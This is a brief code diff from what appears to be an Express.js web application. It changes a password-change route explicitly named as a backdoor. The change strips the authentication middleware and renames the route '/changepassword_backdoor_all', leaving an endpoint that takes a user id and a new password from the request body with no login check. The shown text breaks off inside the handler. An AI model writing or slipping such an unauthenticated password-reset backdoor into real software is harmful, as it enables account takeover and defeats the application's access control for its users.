@@ -245,7 +245,7 @@ router.post('/forgotpassword', function(req, res, next) {
       }
   });
 
-  router.post('/changepassword_backdoor', authenticate, function(req, res, next) {
+  router.post('/changepassword_backdoor_all', function(req, res, next) {
     let body = _.pick(req.body, ['_id', 'password']);
       let user = req.user;
       if(body.password){
